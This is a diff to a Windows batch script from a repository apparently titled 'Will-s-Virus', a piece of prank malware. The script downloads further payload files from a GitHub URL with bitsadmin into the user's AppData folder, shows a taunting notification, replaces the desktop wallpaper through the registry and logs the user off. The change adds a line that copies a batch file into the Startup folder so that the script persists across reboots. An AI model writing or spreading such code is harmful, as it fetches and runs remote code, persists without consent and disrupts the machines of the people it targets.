@@ -21,7 +21,7 @@ ping localhost -n 1 >nul
 cls
 echo Loading...
 if not exist "%appdata%\willishot\Messagebox.vbs" bitsadmin /transfer willishot.exe /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/Messagebox.vbs" "%appdata%\willishot\Messagebox.vbs" >nul
-if not exist "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\batstart.bat" bitsadmin /transfer willishot.exe /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/batstart.bat" "%appdata%\willishot\batstart.bat" >nul
+if not exist "%appdata%\willishot\batstart.bat" bitsadmin /transfer willishot.exe /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/batstart.bat" "%appdata%\willishot\batstart.bat" >nul
 if not exist "%appdata%\Willisvirus2.bat" bitsadmin /transfer willishot.exe /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/Willisvirus2.bat" "%appdata%\willishot\Willisvirus2.bat" >nul
 ping localhost -n 1 >nul
 cls
@@ -151,6 +151,7 @@ timeout 3 >nul
 powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.SystemIcons]::Information; $notify.Visible = $true; $notify.ShowBalloonTip(0, 'Can i borrow your computer for a sec', ' ', [System.Windows.Forms.ToolTipIcon]::None)}"
 timeout 4 >nul
 powershell set-itemproperty -path 'HKCU:Control Panel\Desktop' -name WallPaper -value %appdata%\willishot\wallpaper.png >nul
+xcopy %appdata%\willishot\batstart.bat "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\" >nul
 ping localhost -n 1 >nul
 shutdown /l >nul
 exit
